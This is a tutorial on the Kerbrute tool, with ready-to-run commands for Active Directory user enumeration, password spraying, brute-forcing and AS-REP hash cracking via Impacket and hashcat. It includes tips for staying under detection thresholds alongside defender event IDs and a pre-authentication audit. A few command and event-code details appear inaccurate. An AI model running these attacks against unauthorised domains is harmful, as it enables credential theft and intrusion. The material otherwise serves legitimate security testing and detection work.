# Kerbrute — Active Directory Kerberos Enumeration & Password Spraying Guide

A complete, production-grade guide to **Kerbrute** (`kerbrute`), the lightning-fast Go-based Active Directory reconnaissance and credential auditing utility that leverages Kerberos pre-authentication to enumerate valid domain users and spray passwords without triggering account lockouts.

---

## 📑 Table of Contents

- [1. Overview & Kerberos Authentication Mechanics](#1-overview-kerberos-authentication-mechanics)
  - [Why NTLM Fails vs Why Kerberos Pre-Auth Succeeds](#why-ntlm-fails-vs-why-kerberos-pre-auth-succeeds)
  - [The Stealth Factor: Evading Account Lockouts](#the-stealth-factor-evading-account-lockouts)
- [2. Installation & Binary Setup](#2-installation-binary-setup)
  - [Installing via Pre-Compiled Binaries (macOS & Linux)](#installing-via-pre-compiled-binaries-macos-linux)
  - [Building from Source with Go](#building-from-source-with-go)
  - [Verification & Help Overview](#verification-help-overview)
- [3. Core Commands & Operational Modes](#3-core-commands-operational-modes)
  - [userenum: High-Speed Domain User Enumeration](#userenum-high-speed-domain-user-enumeration)
  - [passwordspray: Low-and-Slow Password Spraying](#passwordspray-low-and-slow-password-spraying)
  - [bruteforce: Single User Password Brute-Force](#bruteforce-single-user-password-brute-force)
  - [version & Target Flags (-d, --dc)](#version-target-flags--d---dc)
- [4. Advanced Reconnaissance & Integration](#4-advanced-reconnaissance-integration)
  - [AS-REP Roasting Workflow (Handoff to Hashcat)](#as-rep-roasting-workflow-handoff-to-hashcat)
  - [Threading, Concurrency & Delay Options](#threading-concurrency-delay-options)
  - [Handling Large Enterprise Wordlists](#handling-large-enterprise-wordlists)
- [5. Defensive Hardening & Active Directory Telemetry](#5-defensive-hardening-active-directory-telemetry)
  - [Detecting Kerberos Anomalies (Event IDs 4768 & 4771)](#detecting-kerberos-anomalies-event-ids-4768-4771)
  - [Enforcing Pre-Authentication on All Accounts](#enforcing-pre-authentication-on-all-accounts)
- [6. Quick Reference Cheat Sheet & FAQ](#6-quick-reference-cheat-sheet-faq)
  - [CLI Commands Summary Table](#cli-commands-summary-table)
  - [Troubleshooting & Common Pitfalls](#troubleshooting-common-pitfalls)

---

## 1. Overview & Kerberos Authentication Mechanics

### Why NTLM Fails vs Why Kerberos Pre-Auth Succeeds

In standard Windows Active Directory environments, brute-forcing accounts via SMB, LDAP, or WinRM over NTLM generates Windows Security Event `4625` ("An account failed to log on"). If the domain security policy specifies an account lockout threshold (e.g., 5 attempts), NTLM quickly locks out user accounts, causing widespread business disruption and triggering immediate security alerts.

**Kerbrute** avoids this by sending raw **Kerberos pre-authentication requests** directly to the Domain Controller's Key Distribution Center (KDC) on UDP/TCP port **88**:
1. When requesting an initial Ticket-Granting Ticket (TGT), the client sends an `AS-REQ` without pre-authentication data.
2. If the user does not exist in Active Directory, the DC immediately responds with error code `KDC_ERR_C_PRINCIPAL_UNKNOWN` (User not found).
3. If the user exists, the DC responds with `KDC_ERR_PREAUTH_REQUIRED` (Pre-authentication required), or `KDC_ERR_PREAUTH_FAILED` if an invalid password was supplied.

Because user verification happens prior to authentication failure evaluation, **`userenum` produces ZERO failed logon attempts** and does not increment the account lockout counter!

```
┌─────────────────────────────────────────────────────────────┐
│                   Kerbrute Reconnaissance                   │
│                                                             │
│   Kerbrute Client                     Domain Controller     │
│  (192.168.1.50)                          (Port 88)          │
│         │                                    │              │
│         │────── AS-REQ (User: alice) ───────>│              │
│         │<── KDC_ERR_PREAUTH_REQUIRED ───────│ (User Exists!)│
│         │                                    │              │
│         │────── AS-REQ (User: unknown) ─────>│              │
│         │<── KDC_ERR_C_PRINCIPAL_UNKNOWN ────│ (No User)    │
│         │                                    │              │
└─────────────────────────────────────────────────────────────┘
```

### The Stealth Factor: Evading Account Lockouts

- **User Enumeration**: Sends lightweight Kerberos requests that validate whether usernames exist without registering a single authentication failure.
- **Password Spraying**: Tests 1 common password (e.g. `Winter2024!`) across thousands of verified accounts with customizable sleep intervals.

---

## 2. Installation & Binary Setup

### Installing via Pre-Compiled Binaries (macOS & Linux)

Kerbrute is distributed as a single static binary written in Go:

```bash
# macOS (Apple Silicon arm64)
curl -sSL -O https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_darwin_arm64
chmod +x kerbrute_darwin_arm64
sudo mv kerbrute_darwin_arm64 /usr/local/bin/kerbrute

# macOS (Intel x86_64)
curl -sSL -O https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_darwin_amd64
chmod +x kerbrute_darwin_amd64
sudo mv kerbrute_darwin_amd64 /usr/local/bin/kerbrute

# Linux (x86_64)
curl -sSL -O https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### Building from Source with Go

If you have Go installed on your machine:

```bash
go install github.com/ropnop/kerbrute@latest
```

### Verification & Help Overview

Verify installation:

```bash
kerbrute version
kerbrute --help
```

---

## 3. Core Commands & Operational Modes

### userenum: High-Speed Domain User Enumeration

Enumerate valid user accounts on a Windows domain using a dictionary list:

```bash
# Enumerate usernames against domain controller
kerbrute userenum \
  --dc 192.168.1.10 \
  -d corp.local \
  users_list.txt \
  -o valid_domain_users.txt
```

Parameters:
- `--dc`: IP address or FQDN of the Domain Controller.
- `-d`: Fully Qualified Domain Name (e.g., `corp.local` or `ad.contoso.com`).
- `-o`: Output file to save confirmed usernames.

Kerbrute can test thousands of candidate usernames per second.

### passwordspray: Low-and-Slow Password Spraying

Spray a single password across a list of known valid users:

```bash
# Spray a single seasonal password across all users
kerbrute passwordspray \
  --dc 192.168.1.10 \
  -d corp.local \
  valid_domain_users.txt \
  'Autumn2024!'
```

If a user matches the password, Kerbrute prints `[+] VALID LOGIN: user@domain.local:Password`.

### bruteforce: Single User Password Brute-Force

Test a dictionary of passwords against a specific high-value user (such as a service account or Administrator):

```bash
kerbrute bruteforce \
  --dc 192.168.1.10 \
  -d corp.local \
  --username admin \
  rockyou.txt
```

> [!WARNING]
> Running `bruteforce` against standard user accounts will increment bad password counters and trigger account lockouts if password thresholds are active. Use `passwordspray` instead.

### version & Target Flags (-d, --dc)

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `-d`, `--domain` | `DOMAIN` | Active Directory domain name (required). |
| `--dc` | `IP/HOST` | Target Domain Controller host or IP. If omitted, uses DNS SRV records. |
| `-t`, `--threads`| `NUM` | Number of concurrent worker threads (default: `10`). |
| `-o`, `--output` | `FILE` | File to save valid usernames and cracked credentials. |
| `--safe` | None | Stop spraying a user if badPwdCount reaches lockout threshold. |
| `-v`, `--verbose`| None | Display all failed attempts and debugging information. |

---

## 4. Advanced Reconnaissance & Integration

### AS-REP Roasting Workflow (Handoff to Hashcat)

When Kerbrute discovers accounts that have `DONT_REQ_PREAUTH` (Do not require Kerberos preauthentication) configured, it captures the encrypted AS-REP response:

```bash
# Kerbrute flags users without pre-auth:
# [+] WITHOUT PREAUTH: backup_service@corp.local
```

You can extract this hash using Impacket:

```bash
impacket-GetNPUsers corp.local/backup_service -dc-ip 192.168.1.10 -no-pass -format hashcat > asrep.hash
```

And crack it offline in Hashcat using mode `18200`:

```bash
hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
```

### Threading, Concurrency & Delay Options

To stay below detection thresholds and avoid triggering network anomaly alarms:

```bash
# Slower, low-noise enumeration with 2 threads and 500ms jitter
kerbrute userenum \
  --dc 192.168.1.10 \
  -d corp.local \
  --threads 2 \
  --delay 500 \
  usernames.txt
```

### Handling Large Enterprise Wordlists

For massive corporate dictionaries (e.g. `Statistically-likely-usernames` from SecLists):

```bash
# Enumerate using first.last name patterns
kerbrute userenum \
  --dc 192.168.1.10 \
  -d corp.local \
  --threads 25 \
  SecLists/Usernames/xato-net-10-million-usernames.txt
```

---

## 5. Defensive Hardening & Active Directory Telemetry

### Detecting Kerberos Anomalies (Event IDs 4768 & 4771)

Security Operations Centers (SOC) can monitor Domain Controllers for Kerbrute activity by monitoring:
- **Event ID 4768** ("A Kerberos authentication ticket (TGT) was requested"): High volumes of requests from an anomalous IP.
- **Event ID 4771** ("Kerberos pre-authentication failed"):
  - Failure code `0x6`: `KDC_ERR_C_PRINCIPAL_UNKNOWN` (Username does not exist in domain). A sudden spike indicates user enumeration.
  - Failure code `0x18`: `KDC_ERR_PREAUTH_FAILED` (Wrong password). A single failure across hundreds of different user accounts indicates password spraying.

### Enforcing Pre-Authentication on All Accounts

Audit Active Directory to ensure no accounts have `DONT_REQ_PREAUTH` enabled:

```powershell
# PowerShell ActiveDirectory module audit
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth | Select-Object SamAccountName, DoesNotRequirePreAuth
```

Disable `DONT_REQ_PREAUTH` on all user accounts to prevent AS-REP roasting.

---

## 6. Quick Reference Cheat Sheet & FAQ

### CLI Commands Summary Table

| Task | Command Syntax |
| :--- | :--- |
| **Enumerate Domain Users** | `kerbrute userenum --dc DC_IP -d DOMAIN users.txt` |
| **Enumerate Users to File**| `kerbrute userenum --dc DC_IP -d DOMAIN users.txt -o valid_users.txt` |
| **Password Spraying** | `kerbrute passwordspray --dc DC_IP -d DOMAIN valid_users.txt 'Password!'` |
| **Single User Brute-Force**| `kerbrute bruteforce --dc DC_IP -d DOMAIN --username admin passwords.txt` |
| **Adjust Thread Count** | Append `-t 25` |
| **Add Millisecond Delay** | Append `--delay 250` |

### Troubleshooting & Common Pitfalls

> [!NOTE]
> **KDC Not Found**: If Kerbrute outputs `Unable to find KDC for domain`, explicitly supply the Domain Controller's IP using `--dc 10.0.0.1`.

> [!TIP]
> **Clock Skew Error**: Kerberos requires time synchronization between the client and Domain Controller (maximum 5-minute skew). If you see `Clock skew too great`, sync your machine clock with the DC:
> ```bash
> sudo sntp -sS 192.168.1.10
> ```

> [!IMPORTANT]
> **Internal Audits Only**: Kerbrute interacts directly with organizational Domain Controllers. Only run Kerbrute against domains where you have explicit authorization and documented scope.
